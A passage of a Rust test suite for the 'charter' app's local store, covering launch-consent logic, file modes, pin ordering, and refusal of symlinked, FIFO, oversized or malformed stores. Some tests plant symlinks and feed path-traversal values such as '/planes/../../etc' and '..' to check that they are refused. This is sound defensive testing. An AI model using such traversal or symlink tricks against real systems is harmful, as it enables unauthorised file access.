    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    std::fs::create_dir_all(plane.join(".charter/app")).unwrap();
    let elsewhere = held.path().join("elsewhere.json");
    std::fs::write(&elsewhere, br#"{"version":1,"at":0,"chats":[]}"#).unwrap();
    std::os::unix::fs::symlink(&elsewhere, crate::reopen::path(&plane)).unwrap();

    assert_eq!(Contribution::of(&plane), Contribution::default());
}

#[test]
fn a_plane_whose_record_would_start_a_new_program_is_asked_about_again() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, Contribution::default());

    let consent = store.consent(plane, &a_launch(&["/bin/sh"]));

    assert!(
        consent.must_ask(),
        "a program the approval never covered would run before there is a window"
    );
    assert!(matches!(consent.changes(), [Change::StartsAdded(_)]));
}

#[test]
fn a_record_that_stops_starting_something_is_only_reported() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, a_launch(&["/bin/sh"]));

    let consent = store.consent(plane, &Contribution::default());

    assert!(!consent.must_ask());
    assert!(matches!(consent.changes(), [Change::StartsRemoved(_)]));
}

#[test]
fn a_new_chat_on_one_of_this_machines_profiles_is_reported_and_never_asked_about() {
    // `Chats::start_recorded` looks the profile up again in machine-local
    // `charter.local.toml`, "never taken from the record", and `profiletrust` gates what
    // it runs. The record chooses WHICH approved profile runs, never what it runs.
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, Contribution::default());

    let consent = store.consent(plane, &on_profiles(&["work"]));

    assert!(
        !consent.must_ask(),
        "asking here asks a second time about a command line profiletrust shows"
    );
    assert!(matches!(consent, Consent::Noted(_)), "{consent:?}");
    assert!(matches!(consent.changes(), [Change::ProfileAdded(_)]));
}

#[test]
fn one_new_program_among_profile_changes_still_asks() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, on_profiles(&["work", "spare"]));
    let mut now = a_launch(&["/bin/sh"]);
    now.profiles = on_profiles(&["work"]).profiles;

    assert!(store.consent(plane, &now).must_ask());
}

// ------------------------------------------------------- charter's own writes

#[test]
fn charters_own_write_of_the_record_refreshes_the_fingerprint_instead_of_asking() {
    // charter rewrites `reopen.json` every time a chat opens or closes. Without this the
    // operator would be asked about the chat they just started — the same
    // training-to-click-yes failure the asymmetry above exists to avoid.
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, Contribution::default());
    let after = a_launch(&["/bin/zsh"]);
    assert!(
        store.consent(plane, &after).must_ask(),
        "the premise: an unvouched new chat asks"
    );

    store.vouch(plane, after.clone(), 2);

    assert_eq!(store.consent(plane, &after), Consent::Unchanged);
}

#[test]
fn vouching_for_a_plane_nobody_approved_never_becomes_consent() {
    let mut store = Store::default();
    let plane = Path::new("/planes/stranger");
    store.remember(plane, 1);

    store.vouch(plane, a_launch(&["/bin/sh"]), 2);

    assert_eq!(
        store.consent(plane, &a_launch(&["/bin/sh"])),
        Consent::New,
        "purlis's own bookkeeping became consent"
    );
}

#[test]
fn a_vouched_fingerprint_survives_the_write_and_the_read() {
    let machine = machine();
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, Contribution::default());
    store.vouch(plane, a_launch(&["/bin/zsh"]), 2);
    write(machine.path(), &store).unwrap();

    let back = read(machine.path());

    assert_eq!(
        back.store.consent(plane, &a_launch(&["/bin/zsh"])),
        Consent::Unchanged
    );
    assert!(
        back.store
            .consent(plane, &a_launch(&["/bin/sh"]))
            .must_ask(),
        "the launch fingerprint did not survive the round trip"
    );
}

// ------------------------------------------------------------- where it lives

#[test]
fn the_config_home_is_the_one_charter_report_already_uses() {
    let home = Some(PathBuf::from("/home/aharon"));
    let set = |value: &str| Some(std::ffi::OsString::from(value));

    assert_eq!(
        rooted(set("/isolated"), set("/xdg"), home.clone()),
        Some(PathBuf::from("/isolated")),
        "CHARTER_CONFIG_HOME wins, so purlis can be isolated without logging `gh` out"
    );
    assert_eq!(
        rooted(None, set("/xdg"), home.clone()),
        Some(PathBuf::from("/xdg"))
    );
    assert_eq!(
        rooted(None, None, home.clone()),
        Some(PathBuf::from("/home/aharon/.config")),
        "report.py:consent_path's last rung"
    );
    assert_eq!(
        rooted(set(""), set(""), home),
        Some(PathBuf::from("/home/aharon/.config")),
        "an exported-but-blank variable is unset"
    );
    assert_eq!(rooted(None, None, None), None, "no home, no store");
}

// ---------------------------------------------------------------- the mode

#[test]
fn the_store_is_0600_in_a_0700_directory() {
    let machine = machine();

    write(machine.path(), &one_plane()).unwrap();

    assert_eq!(mode_of(&file(machine.path())), 0o600);
    assert_eq!(mode_of(&dir(machine.path())), 0o700);
}

#[test]
fn the_mode_is_charters_and_not_whatever_the_umask_left() {
    // Without this the test above passes on a machine whose umask happens to be 077 even
    // with every mode dropped. A control made the ordinary way, in the same directory,
    // under the same umask: if the two ever match, this fails rather than quietly
    // vouching for nothing.
    let machine = machine();
    write(machine.path(), &one_plane()).unwrap();
    let control = dir(machine.path()).join("control");
    std::fs::write(&control, b"x").unwrap();

    assert_ne!(
        mode_of(&file(machine.path())),
        mode_of(&control),
        "purlis's mode and the umask's are the same, so this suite proves nothing \
         about the mode: run it under a umask that is not 077"
    );
}

#[test]
fn a_directory_that_was_already_there_at_0755_is_tightened() {
    // charter's own directory, at a path charter alone decides — unlike a plane's state
    // directory, which `$CHARTER_HOME` may point at a share.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::set_permissions(dir(machine.path()), std::fs::Permissions::from_mode(0o755)).unwrap();

    write(machine.path(), &one_plane()).unwrap();

    assert_eq!(mode_of(&dir(machine.path())), 0o700);
}

#[test]
fn the_config_home_itself_is_not_re_moded_by_charter() {
    // `~/.config` belongs to the operator and to every application on the machine.
    let held = machine();
    let data = held.path().join("share");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o755)).unwrap();

    write(&data, &one_plane()).unwrap();

    assert_eq!(mode_of(&data), 0o755);
}

// ---------------------------------------------------------------- the gate

#[test]
fn a_link_at_the_store_itself_is_not_read_through() {
    let machine = machine();
    let elsewhere = machine.path().join("elsewhere.json");
    std::fs::write(&elsewhere, br#"{"version":1,"at":0,"recents":[]}"#).unwrap();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::os::unix::fs::symlink(&elsewhere, file(machine.path())).unwrap();

    let back = read(machine.path());

    assert!(
        back.unreadable.is_some(),
        "a linked store was read as this machine's"
    );
}

#[test]
fn a_link_at_charters_own_directory_is_not_read_through() {
    let machine = machine();
    let elsewhere = machine.path().join("elsewhere");
    std::fs::create_dir_all(&elsewhere).unwrap();
    std::fs::write(
        elsewhere.join(FILE),
        br#"{"version":1,"at":0,"recents":[{"plane":"/planted","opened":0}]}"#,
    )
    .unwrap();
    std::os::unix::fs::symlink(&elsewhere, dir(machine.path())).unwrap();

    let back = read(machine.path());

    assert!(back.unreadable.is_some(), "{back:?}");
    assert_eq!(back.store, Store::default());
}

#[test]
fn a_store_that_is_a_link_is_refused_and_what_it_points_at_is_untouched() {
    // #434: a link at the store's own name used to be replaced by the rename; it is now
    // refused, as every whole-file writer refuses one. The temp file the bytes land on is
    // gated by the same walk (`rewrite`'s own tests plant links there).
    let machine = machine();
    let theirs = machine.path().join("theirs.json");
    std::fs::write(&theirs, "THEIRS\n").unwrap();
    let dir = private_dir(machine.path()).unwrap();
    std::os::unix::fs::symlink(&theirs, dir.join(FILE)).unwrap();

    let refused = write(machine.path(), &one_plane());

    assert!(refused.is_err(), "a linked store was written");
    assert_eq!(std::fs::read_to_string(&theirs).unwrap(), "THEIRS\n");
    assert!(dir.join(FILE).is_symlink());
}

#[test]
fn a_store_write_that_dies_before_its_rename_leaves_the_old_store_whole() {
    let machine = machine();
    let dir = private_dir(machine.path()).unwrap();
    std::fs::write(dir.join(FILE), "old\n").unwrap();
    let _killed = crate::rewrite::hook::set(|_, _| Err(io::Error::other("killed")));

    assert!(write(machine.path(), &one_plane()).is_err());

    assert_eq!(std::fs::read_to_string(dir.join(FILE)).unwrap(), "old\n");
    let names: Vec<_> = std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    assert_eq!(names, [FILE], "no temp was left beside the store");
}

#[test]
fn a_write_through_a_linked_directory_is_refused_at_the_moment_of_the_create() {
    let machine = machine();
    let elsewhere = machine.path().join("elsewhere");
    std::fs::create_dir_all(&elsewhere).unwrap();
    std::os::unix::fs::symlink(&elsewhere, dir(machine.path())).unwrap();

    let refused = write(machine.path(), &one_plane());

    assert!(refused.is_err(), "the store was written through a link");
    assert!(!elsewhere.join(FILE).exists());
}

#[test]
fn a_store_that_is_not_a_plain_file_is_refused_instead_of_read_for_ever() {
    // A FIFO is not a link, so a link check waves it through, and `read_to_string` on one
    // never returns — at a cold launch, before there is a window to close.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    let made =
        crate::forklock::status(std::process::Command::new("mkfifo").arg(file(machine.path())))
            .expect("mkfifo runs");
    assert!(made.success(), "the test needs a fifo to plant");

    // In a thread, because the whole point is that the unguarded version never returns.
    let (say, heard) = std::sync::mpsc::channel();
    let asked = machine.path().to_path_buf();
    std::thread::spawn(move || say.send(read(&asked).unreadable));
    let answered = heard
        .recv_timeout(Duration::from_secs(5))
        .expect("reading a fifo store must not block a launch");

    assert!(answered.is_some(), "a fifo store was accepted");
}

#[test]
fn a_store_too_large_to_be_one_is_refused_rather_than_read_whole() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    let planted = std::fs::File::create(file(machine.path())).unwrap();
    planted.set_len(MAX_BYTES + 1).unwrap();

    let back = read(machine.path());

    assert!(
        back.unreadable
            .is_some_and(|why| why.contains("never larger than")),
        "an oversized store was read whole"
    );
}

#[test]
fn a_store_charter_could_not_read_is_never_overwritten() {
    let machine = machine();
    let captured = machine.path().join("captured.json");
    std::fs::write(&captured, b"the operator's other file").unwrap();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::os::unix::fs::symlink(&captured, file(machine.path())).unwrap();

    let refused = update(machine.path(), |store| {
        store.remember(Path::new("/planes/new"), 1)
    });

    assert!(refused.is_err(), "an unreadable store was clobbered");
    assert_eq!(
        std::fs::read_to_string(&captured).unwrap(),
        "the operator's other file",
        "the file behind the link was rewritten"
    );
}

#[test]
fn a_store_charter_could_read_and_did_not_understand_is_replaced() {
    // The other half of the rule above, and the reason the two are told apart: content
    // that says nothing is worth replacing, a path charter cannot read is not.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(file(machine.path()), b"not json at all").unwrap();

    let done = update(machine.path(), |store| {
        store.remember(Path::new("/planes/new"), 1)
    })
    .expect("a malformed store is replaced, not a wall");

    assert!(matches!(done.dropped.as_slice(), [Dropped::TheStore(_)]));
    assert_eq!(read(machine.path()).store.recents.len(), 1);
}

#[test]
fn a_store_of_another_version_is_not_guessed_at() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":99,"at":0,"recents":[{"plane":"/planes/old","opened":1}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store, Store::default());
    assert!(matches!(back.dropped.as_slice(), [Dropped::TheStore(_)]));
}

// ---------------------------------------------------------------- entries off the file

#[test]
fn a_remembered_path_that_is_not_absolute_is_dropped_with_a_reason() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[
             {"plane":"relative/plane","opened":1},
             {"plane":"/planes/good","opened":2}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.recents.len(), 1, "{:?}", back.store.recents);
    assert_eq!(back.store.recents[0].plane, PathBuf::from("/planes/good"));
    assert!(
        back.dropped
            .iter()
            .any(|d| d.to_string().contains("relative/plane")),
        "a dropped row must say which one and why: {:?}",
        back.dropped
    );
}

#[test]
fn a_remembered_path_that_walks_up_is_dropped() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[{"plane":"/planes/../../etc","opened":1}]}"#,
    )
    .unwrap();

    assert_eq!(read(machine.path()).store.recents, Vec::new());
}

#[test]
fn one_malformed_entry_costs_one_row_and_not_the_list() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[
             7,
             {"plane":"/planes/good","opened":2}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.recents.len(), 1);
    assert_eq!(back.dropped.len(), 1);
}

#[test]
fn a_window_that_points_past_its_own_tabs_still_opens() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[],"windows":[
             {"planes":["relative","/planes/good"],"active":1}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.windows.len(), 1);
    assert_eq!(
        back.store.windows[0].planes,
        [PathBuf::from("/planes/good")]
    );
    assert_eq!(back.store.windows[0].active, 0);
}

#[test]
fn a_plane_listed_twice_is_remembered_once() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[
             {"plane":"/planes/a","opened":9},
             {"plane":"/planes/a","opened":1}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.recents.len(), 1);
    assert_eq!(
        back.store.recents[0].opened, 9,
        "the first one is the newest"
    );
}

#[test]
fn a_file_holding_more_planes_than_charter_remembers_is_cut_to_the_bound() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    let rows: Vec<String> = (0..MOST_RECENTS + 5)
        .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n}}}"#))
        .collect();
    std::fs::write(
        file(machine.path()),
        format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.recents.len(), MOST_RECENTS);
    assert_eq!(back.dropped.len(), 5);
}

// ------------------------------------------------- pins (ADR 0039, 0040)

/// A store remembering `planes`, in the order they were opened.
fn remembering(planes: &[&str]) -> Store {
    let mut store = Store::default();
    for (n, plane) in planes.iter().enumerate() {
        store.remember(Path::new(plane), n as u64);
    }
    store
}

#[test]
fn a_pin_is_kept_on_the_plane_it_is_about() {
    let mut store = remembering(&["/planes/a", "/planes/b"]);

    assert_eq!(store.pin(Path::new("/planes/a"), true), Ok(true));

    assert!(store.recent(Path::new("/planes/a")).unwrap().pinned);
    assert!(!store.recent(Path::new("/planes/b")).unwrap().pinned);
}

#[test]
fn pinning_what_is_already_pinned_changes_nothing() {
    let mut store = remembering(&["/planes/a"]);
    store.pin(Path::new("/planes/a"), true).unwrap();

    assert_eq!(store.pin(Path::new("/planes/a"), true), Ok(false));
}

#[test]
fn a_plane_charter_does_not_remember_cannot_be_pinned() {
    // An entry that existed only to hold a pin would be a plane path in this file that no
    // open ever put there, which is a different kind of thing from the list this file is.
    let mut store = remembering(&["/planes/a"]);

    assert!(store.pin(Path::new("/planes/elsewhere"), true).is_err());
    assert_eq!(store.recents.len(), 1);
}

#[test]
fn a_pinned_project_does_not_fall_off_the_end_of_the_recents() {
    // ADR 0040: a pin is the only thing an operator can say to mean "not this
    // one", so the sixty-fifth plane opened must not silently undo it.
    let mut store = remembering(&["/planes/kept"]);
    store.pin(Path::new("/planes/kept"), true).unwrap();

    for n in 0..MOST_RECENTS + 10 {
        store.remember(&PathBuf::from(format!("/planes/{n}")), 100 + n as u64);
    }

    assert!(store.recent(Path::new("/planes/kept")).is_some());
    assert_eq!(store.recents.len(), MOST_RECENTS + 1);
}

#[test]
fn unpinning_keeps_the_plane_unpinned_and_lets_the_oldest_other_one_past_the_bound_go() {
    // #1240 F2: the unpin's Undo pins it back, which needs it remembered. The bound still
    // holds: the oldest of the others goes in its place.
    let mut store = remembering(&["/planes/kept"]);
    store.pin(Path::new("/planes/kept"), true).unwrap();
    for n in 0..MOST_RECENTS + 10 {
        store.remember(&PathBuf::from(format!("/planes/{n}")), 100 + n as u64);
    }
    let oldest = store.recents[MOST_RECENTS - 1].plane.clone();

    store.pin(Path::new("/planes/kept"), false).unwrap();

    assert!(
        store
            .recent(Path::new("/planes/kept"))
            .is_some_and(|kept| !kept.pinned)
    );
    assert!(store.recent(&oldest).is_none(), "the oldest other one went");
    assert_eq!(store.recents.len(), MOST_RECENTS);
    assert_eq!(
        store.pin(Path::new("/planes/kept"), true),
        Ok(true),
        "the Undo pins it back"
    );
    assert_eq!(
        store.recents.len(),
        MOST_RECENTS,
        "a pin with the recents full lets nothing go"
    );
}

#[test]
fn there_is_a_bound_on_the_pins_as_well() {
    // The pin exempts an entry from the recents bound, so without one of its own the file
    // would have none — and it is read whole at a cold launch.
    let planes: Vec<String> = (0..MOST_PINNED + 1)
        .map(|n| format!("/planes/{n}"))
        .collect();
    let mut store = remembering(&planes.iter().map(String::as_str).collect::<Vec<_>>());

    for plane in planes.iter().take(MOST_PINNED) {
        assert_eq!(store.pin(Path::new(plane), true), Ok(true));
    }

    assert!(store.pin(Path::new(&planes[MOST_PINNED]), true).is_err());
}

#[test]
fn a_workspace_pin_is_a_name_and_never_a_path() {
    let mut store = remembering(&["/planes/a"]);

    assert!(
        store
            .pin_workspace(Path::new("/planes/a"), "ide", true)
            .is_ok()
    );
    for refused in ["", "..", ".", "a/b", "a\\b", "a\0b"] {
        assert!(
            store
                .pin_workspace(Path::new("/planes/a"), refused, true)
                .is_err(),
            "{refused:?} was taken as a workspace name"
        );
    }
}

#[test]
fn a_pinned_workspace_that_is_no_longer_there_is_named_rather_than_drawn() {
    // The hazard ADR 0034 names for a trust entry keyed on a path, one scope down: a
    // reference that no longer resolves must not become something charter offers.
    let mut store = remembering(&["/planes/a"]);
    store
        .pin_workspace(Path::new("/planes/a"), "ide", true)
        .unwrap();
    store
        .pin_workspace(Path::new("/planes/a"), "gone", true)
        .unwrap();

    let (kept, missing) = store.pinned_workspaces(Path::new("/planes/a"), &["fleet", "ide"]);

    assert_eq!(kept, ["ide"]);
    assert_eq!(missing, ["gone"]);
}

#[test]
fn pinned_workspaces_come_back_in_the_order_they_were_pinned_in() {
    // The workspace strip draws its pins in pin order (ADR 0054, charter#402), so the
    // plane's own order — alphabetical here — must not win over the operator's.
    let mut store = remembering(&["/planes/a"]);
    for name in ["zeta", "alpha", "mu"] {
        store
            .pin_workspace(Path::new("/planes/a"), name, true)
            .unwrap();
    }

    let (kept, _) =
        store.pinned_workspaces(Path::new("/planes/a"), &["alpha", "beta", "mu", "zeta"]);

    assert_eq!(kept, ["zeta", "alpha", "mu"]);
}

#[test]
fn unpinning_one_in_the_middle_keeps_the_others_order_and_a_repin_goes_last() {
    let mut store = remembering(&["/planes/a"]);
    let plane = Path::new("/planes/a");
    for name in ["zeta", "alpha", "mu"] {
        store.pin_workspace(plane, name, true).unwrap();
    }

    assert_eq!(store.pin_workspace(plane, "alpha", false), Ok(true));
    let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
    assert_eq!(kept, ["zeta", "mu"]);

    store.pin_workspace(plane, "alpha", true).unwrap();
    let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
    assert_eq!(kept, ["zeta", "mu", "alpha"]);
}

#[test]
fn arranging_the_pinned_workspaces_puts_them_in_the_order_the_operator_dragged_them_to() {
    // Pin order was the order of pinning until the strip could be dragged (SI-6). Once
    // it can, the order the operator left it in is the order it is drawn in.
    let mut store = remembering(&["/planes/a"]);
    let plane = Path::new("/planes/a");
    for name in ["zeta", "alpha", "mu"] {
        store.pin_workspace(plane, name, true).unwrap();
    }

    assert_eq!(
        store.arrange_workspaces(plane, &["mu", "zeta", "alpha"]),
        Ok(true)
    );

    let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
    assert_eq!(kept, ["mu", "zeta", "alpha"]);
}

#[test]
fn arranging_the_pins_in_the_order_they_already_have_changes_nothing() {
    let mut store = remembering(&["/planes/a"]);
    let plane = Path::new("/planes/a");
    for name in ["zeta", "alpha"] {
        store.pin_workspace(plane, name, true).unwrap();
    }

    assert_eq!(
        store.arrange_workspaces(plane, &["zeta", "alpha"]),
        Ok(false)
    );
}

#[test]
fn arranging_never_pins_a_workspace_that_was_not_pinned() {
    // Pinning is its own act, with its own bound and its own refusal. An arrangement that
    // names a workspace nobody pinned has nothing to arrange about it.
    let mut store = remembering(&["/planes/a"]);
    let plane = Path::new("/planes/a");
    for name in ["zeta", "alpha"] {
        store.pin_workspace(plane, name, true).unwrap();
    }

    store
        .arrange_workspaces(plane, &["alpha", "ide", "zeta"])
        .unwrap();

    let (kept, _) = store.pinned_workspaces(plane, &["alpha", "ide", "zeta"]);
    assert_eq!(kept, ["alpha", "zeta"]);
}

#[test]
fn a_pin_the_window_was_not_drawing_keeps_its_place_when_the_rest_are_arranged() {
    // A pin whose workspace has gone from disk is named, never drawn, so the window
    // arranges only the ones it drew. The dangling one is not the window's to move.
    let mut store = remembering(&["/planes/a"]);
    let plane = Path::new("/planes/a");
    for name in ["zeta", "gone", "alpha", "mu"] {
        store.pin_workspace(plane, name, true).unwrap();
    }

    store
        .arrange_workspaces(plane, &["mu", "alpha", "zeta"])
        .unwrap();

    let (kept, missing) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
    assert_eq!(kept, ["mu", "alpha", "zeta"]);
    assert_eq!(missing, ["gone"]);
    assert_eq!(
        store.recent(plane).unwrap().pinned_workspaces,
        ["mu", "gone", "alpha", "zeta"]
    );
}

#[test]
fn arranging_workspaces_in_a_plane_charter_does_not_remember_is_refused() {
    let mut store = remembering(&["/planes/a"]);

    assert!(
        store
            .arrange_workspaces(Path::new("/planes/b"), &["ide"])
            .is_err()
    );
}

#[test]
fn pin_order_survives_being_written_and_read_back() {
    let machine = machine();
    let mut store = remembering(&["/planes/a"]);
    for name in ["zeta", "alpha", "mu"] {
        store
            .pin_workspace(Path::new("/planes/a"), name, true)
            .unwrap();
    }

    write(machine.path(), &store).unwrap();
    let back = read(machine.path()).store;

    let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &["alpha", "mu", "zeta"]);
    assert_eq!(kept, ["zeta", "alpha", "mu"]);
}

#[test]
fn a_store_written_before_pins_had_an_order_keeps_its_pins_in_the_planes_order() {
    // An older charter kept these as a set and wrote them sorted, which is the order the
    // plane lists its workspaces in. Upgrading must neither lose them nor reshuffle a
    // strip the operator already knows (charter#402). A name written twice is one pin.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[
             {"plane":"/planes/a","opened":1,"mostActivePinned":true,
              "pinnedWorkspaces":["alpha","ide","ide","zeta"]}]}"#,
    )
    .unwrap();

    let mut back = read(machine.path()).store;

    let there = ["alpha", "beta", "ide", "zeta"];
    let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &there);
    assert_eq!(kept, ["alpha", "ide", "zeta"]);
    // And the next pin goes after them, as any pin does.
    back.pin_workspace(Path::new("/planes/a"), "beta", true)
        .unwrap();
    let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &there);
    assert_eq!(kept, ["alpha", "ide", "zeta", "beta"]);
}

/// A plane on disk holding these workspaces, each last active at the second given: its
/// `workspace.md` was last written then, which is what `briefing`'s `last_active` reads.
fn a_plane_with_workspaces(at: &Path, active: &[(&str, u64)]) -> PathBuf {
    let plane = a_plane(at);
    for (name, when) in active {
        let charter = plane.join("workspaces").join(name).join("workspace.md");
        std::fs::create_dir_all(charter.parent().unwrap()).unwrap();
        std::fs::write(&charter, "").unwrap();
        std::fs::File::options()
            .write(true)
            .open(&charter)
            .unwrap()
            .set_modified(std::time::UNIX_EPOCH + Duration::from_secs(*when))
            .unwrap();
    }
    plane
}

#[test]
fn the_first_open_pins_the_three_most_recently_active_workspaces() {
    let planes = tempfile::tempdir().unwrap();
    let plane = a_plane_with_workspaces(
        &planes.path().join("p"),
        &[
            ("alpha", 1_000),
            ("beta", 4_000),
            ("gamma", 2_000),
            ("delta", 3_000),
        ],
    );
    let mut store = Store::default();
    store.remember(&plane, 1);

    assert!(store.pin_the_most_active(&plane));

    let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "delta", "gamma"]);
    assert_eq!(kept, ["beta", "delta", "gamma"]);
}

#[test]
fn workspaces_equally_recently_active_are_pinned_in_name_order() {
    // The strip draws the pins in their order, so the order of a tie is the strip's order: by
    // name, whatever order the filesystem happened to list or write the workspaces in.
    let planes = tempfile::tempdir().unwrap();
    let plane = a_plane_with_workspaces(
        &planes.path().join("p"),
        &[
            ("gamma", 2_000),
            ("beta", 2_000),
            ("alpha", 2_000),
            ("delta", 1_000),
        ],
    );
    let mut store = Store::default();
    store.remember(&plane, 1);

    assert!(store.pin_the_most_active(&plane));

    let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "delta", "gamma"]);
    assert_eq!(kept, ["alpha", "beta", "gamma"]);
}

#[test]
fn the_most_active_are_pinned_once_and_never_again_after_everything_is_unpinned() {
    // An operator who unpinned everything said so. A strip that pinned again at the next
    // launch would be the one that pins on its own, which ADR 0054 refuses.
    let machine = machine();
    let planes = tempfile::tempdir().unwrap();
    let plane = a_plane_with_workspaces(
        &planes.path().join("p"),
        &[("alpha", 1_000), ("beta", 2_000)],
    );
    let mut store = Store::default();
    store.remember(&plane, 1);
    store.pin_the_most_active(&plane);
    for name in ["alpha", "beta"] {
        store.pin_workspace(&plane, name, false).unwrap();
    }
    write(machine.path(), &store).unwrap();
    let mut back = read(machine.path()).store;

    assert!(!back.pin_the_most_active(&plane));

    let (kept, _) = back.pinned_workspaces(&plane, &["alpha", "beta"]);
    assert!(kept.is_empty(), "{kept:?}");
}

#[test]
fn a_plane_the_operator_already_pinned_in_is_left_as_they_arranged_it() {
    // Their pins are their arrangement. Adding three they did not choose would be the
    // strip rearranging itself, so the one-time pinning is spent without pinning anything,
    // and unpinning later does not set it off either.
    let planes = tempfile::tempdir().unwrap();
    let plane = a_plane_with_workspaces(
        &planes.path().join("p"),
        &[("alpha", 1_000), ("beta", 2_000), ("gamma", 3_000)],
    );
    let mut store = Store::default();
    store.remember(&plane, 1);
    store.pin_workspace(&plane, "alpha", true).unwrap();

    assert!(!store.pin_the_most_active(&plane));
    let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "gamma"]);
    assert_eq!(kept, ["alpha"]);

    store.pin_workspace(&plane, "alpha", false).unwrap();
    assert!(!store.pin_the_most_active(&plane));
    let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "gamma"]);
    assert!(kept.is_empty(), "{kept:?}");
}

#[test]
fn a_workspace_made_after_the_first_open_is_pinned_beside_the_most_active() {
    // The window pins a workspace it made (ADR 0054). That is the operator's pin, and it
    // must not set the one-time pinning off again over the ones they left unpinned.
    let planes = tempfile::tempdir().unwrap();
    let plane = a_plane_with_workspaces(
        &planes.path().join("p"),
        &[
            ("alpha", 1_000),
            ("beta", 2_000),
            ("gamma", 3_000),
            ("delta", 4_000),
        ],
    );
    let mut store = Store::default();
    store.remember(&plane, 1);
    store.pin_the_most_active(&plane);
    a_plane_with_workspaces(&plane, &[("epsilon", 5_000)]);

    assert_eq!(store.pin_workspace(&plane, "epsilon", true), Ok(true));
    assert!(!store.pin_the_most_active(&plane));

    // The one-time pins in the order charter pinned them, most active first, and the
    // operator's own after them.
    let there = ["alpha", "beta", "delta", "epsilon", "gamma"];
    let (kept, _) = store.pinned_workspaces(&plane, &there);
    assert_eq!(kept, ["delta", "gamma", "beta", "epsilon"]);
}

#[test]
fn a_store_with_nothing_pinned_is_the_file_charter_wrote_before_pins_existed() {
    // The fields are left out at their defaults, so an older charter reading this file
    // sees exactly what it used to and this one reads their absence as "nothing pinned".
    let machine = machine();
    let mut store = Store::default();
    store.remember(Path::new("/planes/a"), 7);

    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(!text.contains("pinned"), "{text}");
}

#[test]
fn a_pin_survives_being_written_and_read_back() {
    let machine = machine();
    let mut store = Store::default();
    store.remember(Path::new("/planes/a"), 7);
    store.pin(Path::new("/planes/a"), true).unwrap();
    store
        .pin_workspace(Path::new("/planes/a"), "ide", true)
        .unwrap();

    write(machine.path(), &store).unwrap();
    let back = read(machine.path());

    let entry = back.store.recent(Path::new("/planes/a")).unwrap();
    assert!(entry.pinned);
    assert_eq!(
        entry.pinned_workspaces.iter().collect::<Vec<_>>(),
        [&"ide".to_owned()]
    );
}

#[test]
fn a_pinned_workspace_charter_would_not_write_is_dropped_with_its_reason() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[
             {"plane":"/planes/a","opened":1,
              "pinnedWorkspaces":["ide","../elsewhere","a/b",7]}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    let entry = back.store.recent(Path::new("/planes/a")).unwrap();
    assert_eq!(
        entry.pinned_workspaces.iter().collect::<Vec<_>>(),
        [&"ide".to_owned()]
    );
    assert_eq!(
        back.dropped
            .iter()
            .filter(|why| matches!(why, Dropped::Pin { .. }))
            .count(),
        3
    );
}

#[test]
fn a_pin_that_is_not_a_boolean_is_not_a_pin() {
